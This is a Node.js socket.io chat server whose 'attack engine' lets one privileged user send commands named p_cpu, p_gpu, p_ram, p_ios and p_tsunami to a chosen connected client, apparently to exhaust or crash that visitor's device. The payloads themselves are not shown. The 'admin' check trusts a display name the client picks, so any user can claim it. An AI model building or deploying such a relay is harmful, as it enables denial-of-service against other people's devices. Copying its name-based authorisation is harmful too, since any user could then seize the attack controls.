const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const path = require('path');

const app = express();
const server = http.createServer(app);
const io = new Server(server);

// --- CONFIGURATION PUNCH ---
// On lie le dossier "public" pour le HTML/CSS
app.use(express.static(path.join(__dirname, 'public')));

let users = [];

io.on('connection', (socket) => {
    console.log(`[CONNEXION] ID: ${socket.id}`);

    // Initialisation du Stand User
    socket.on('init', (data) => {
        const newUser = { 
            id: socket.id, 
            name: data.name || "Stand_User" 
        };
        users.push(newUser);
        io.emit('sync', users);
        console.log(`[PUNCH_SYNC] ${newUser.name} est prêt au combat.`);
    });

    // Chat Relay
    socket.on('chat', (msg) => {
        const user = users.find(u => u.id === socket.id);
        if (user) {
            io.emit('chat', { n: user.name, t: msg });
        }
    });

    // --- MOTEUR D'ATTAQUE [THE WORLD] ---
    const abilities = ['p_combo', 'p_tsunami', 'p_cpu', 'p_gpu', 'p_ios', 'p_ram'];
    
    abilities.forEach(ability => {
        socket.on(ability, (targetId) => {
            const admin = users.find(u => u.id === socket.id);
            
            // Vérification du grade Master
            if (admin && admin.name === "toucheur2pp") {
                console.log(`[EXECUTION] ${ability.toUpperCase()} sur ${targetId}`);
                io.to(targetId).emit('execute', { type: ability });
            }
        });
    });

    socket.on('disconnect', () => {
        users = users.filter(u => u.id !== socket.id);
        io.emit('sync', users);
        console.log(`[DECONNEXION] ID: ${socket.id}`);
    });
});

// Route par défaut pour éviter le "Cannot GET /"
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => {
    console.log(`
    🥊 PUNCH SERVER ACTIVE [MODE: server.js]
    ----------------------------------------
    > Local : http://localhost:${PORT}
    > Statut : ORA ORA ORA ORA !
    ----------------------------------------
    `);
});
